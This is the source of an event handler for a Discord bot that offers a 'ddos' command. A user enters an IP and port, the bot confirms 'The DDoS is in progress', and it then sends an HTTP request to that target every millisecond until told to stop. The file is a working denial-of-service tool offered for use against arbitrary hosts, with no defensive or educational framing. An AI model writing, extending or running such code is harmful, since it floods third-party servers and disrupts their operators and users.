const { EmbedBuilder } = require("discord.js");
const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;

module.exports = {
    name: "interactionCreate",
    async execute(client, interaction) {
        if (!interaction.guild) return;
        if (interaction.customId === "ddos"){
            const noip = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setDescription("`❌` Please provide a valid IP. [Contact](https://github.com/dekart1017)")

            const ip = interaction.fields.getTextInputValue("ip")
            const port = interaction.fields.getTextInputValue("port") || "65535"

            if (!ipRegex.test(ip)) return interaction.reply({embeds: [noip], ephemeral: true})
            
            const embed = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setDescription(`\`🛜\` The DDoS is in progress. It will only stop if you use \`/ddos stop\`. [Contact](https://github.com/dekart1017)`)
            
            interaction.reply({embeds: [embed], ephemeral: true})
            client.data[`${interaction.guild.id}-${interaction.user.id}`] = setInterval(() => fetch(`http://${ip}:${port}`), 1);
        }
    }
}
